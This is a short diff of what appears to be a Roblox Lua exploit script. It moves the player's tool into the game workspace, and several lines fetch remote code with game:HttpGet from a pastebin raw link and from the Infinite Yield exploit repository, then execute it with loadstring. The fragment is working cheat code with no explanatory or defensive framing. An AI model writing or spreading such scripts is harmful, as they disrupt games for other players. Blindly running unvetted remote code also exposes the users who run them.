@@ -37,3 +37,5 @@ game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.W
 end)
 wait(0)
   loadstring(game:HttpGet('https://pastebin.com/raw/1dM3mAJq'))()
+                          wait(0)
+                          loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
